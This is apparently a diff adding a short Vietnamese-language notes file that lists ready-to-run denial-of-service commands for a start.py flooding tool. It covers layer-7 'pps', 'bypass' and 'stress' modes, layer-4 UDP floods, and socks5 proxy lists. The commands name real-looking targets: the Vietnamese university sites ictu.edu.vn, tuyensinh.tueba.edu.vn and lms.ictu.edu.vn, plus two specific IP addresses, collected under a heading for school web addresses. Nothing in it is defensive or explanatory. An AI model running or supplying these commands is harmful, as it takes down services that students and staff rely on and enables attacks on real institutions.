@@ -1,0 +1,17 @@
+- Tấn công layer7 (theo gói tin):
+python3 start.py pps http://117.6.44.221/ 1 1000 0 100 100 --debug
+python3 start.py pps https://ictu.edu.vn/ 1 1000 0 100 100 --debug
+
+- Tấn công layer4:
+python3 start.py udp http://117.6.44.221/ 1000 25 100
+python3 start.py udp http://117.6.44.221/ 1 100 1
+
+- Các kiểu tấn công khác:
+python3 start.py bypass http://tuyensinh.tueba.edu.vn/ 1 1000 0 100 100 --debug
+python3 start.py stress https://ictu.edu.vn/ 0 1000 socks5.txt 1000 25 --debug
+python3 start.py pps tueba.edu.vn 1 1000 socks5.txt 10000 200 --debug
+python3 start.py pps 37.187.56.77 1 1000 socks5.txt 10000 200 --debug
+
+- Các địa chỉ web trường:
+117.6.44.221
+lms.ictu.edu.vn
